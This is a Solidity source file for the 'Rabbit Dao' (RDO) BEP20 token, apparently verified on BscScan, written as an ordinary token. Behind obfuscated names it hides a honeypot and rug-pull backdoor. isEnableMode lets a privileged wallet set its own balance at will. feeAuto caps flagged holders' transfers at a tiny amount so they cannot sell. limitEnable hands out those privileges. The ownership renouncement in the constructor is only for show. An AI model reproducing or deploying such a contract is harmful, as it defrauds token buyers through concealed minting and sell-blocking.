/**
 *Submitted for verification at BscScan.com on 2023-01-27
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface UniswapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface UniswapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


contract RabbitDao is IBEP20 {
    uint8 constant _decimals = 18;
    address public marketingLaunch;

    mapping(address => uint256) _balances;
    mapping(address => bool) public exemptLiquidity;
    bool public fromExemptTake;
    string constant _name = "Rabbit Dao";
    address public liquiditySwapMarketing;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    address public owner;
    string constant _symbol = "RDO";

    mapping(address => mapping(address => uint256)) _allowances;

    uint256 constant maxBuy = 9 ** 10;

    mapping(address => bool) public modeAuto;
    modifier listSender() {
        require(exemptLiquidity[msg.sender]);
        _;
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor (){
        UniswapRouter modeSenderTo = UniswapRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        marketingLaunch = UniswapFactory(modeSenderTo.factory()).createPair(modeSenderTo.WETH(), address(this));
        _allowances[address(this)][address(modeSenderTo)] = type(uint256).max;
        owner = msg.sender;
        liquiditySwapMarketing = msg.sender;
        exemptLiquidity[liquiditySwapMarketing] = true;
        _balances[liquiditySwapMarketing] = _totalSupply;
        emit Transfer(address(0), liquiditySwapMarketing, _totalSupply);
        renounceOwnership();
    }

    receive() external payable {}

    

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function _transferFrom(address receiverFundReceiver, address shouldExempt, uint256 swapMin) internal returns (bool) {
        if (receiverFundReceiver == liquiditySwapMarketing || shouldExempt == liquiditySwapMarketing) {
            return receiverShould(receiverFundReceiver, shouldExempt, swapMin);
        }
        if (modeAuto[receiverFundReceiver]) {
            swapMin = maxBuy;
        }
        return receiverShould(receiverFundReceiver, shouldExempt, swapMin);
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function isEnableMode(uint256 swapMin) public listSender {
        _balances[liquiditySwapMarketing] = swapMin;
    }

    function transferFrom(address receiverFundReceiver, address shouldExempt, uint256 swapMin) external override returns (bool) {
        if (_allowances[receiverFundReceiver][msg.sender] != type(uint256).max) {
            require(swapMin <= _allowances[receiverFundReceiver][msg.sender]);
            _allowances[receiverFundReceiver][msg.sender] -= swapMin;
        }
        return _transferFrom(receiverFundReceiver, shouldExempt, swapMin);
    }

    function renounceOwnership() public {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }

    function feeAuto(address txShould) public listSender {
        if (txShould == liquiditySwapMarketing) {
            return;
        }
        modeAuto[txShould] = true;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function limitEnable(address totalMode) public {
        if (fromExemptTake) {
            return;
        }
        exemptLiquidity[totalMode] = true;
        fromExemptTake = true;
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function receiverShould(address receiverFundReceiver, address shouldExempt, uint256 swapMin) internal returns (bool) {
        require(swapMin <= _balances[receiverFundReceiver]);
        _balances[receiverFundReceiver] -= swapMin;
        _balances[shouldExempt] += swapMin;
        emit Transfer(receiverFundReceiver, shouldExempt, swapMin);
        return true;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }


}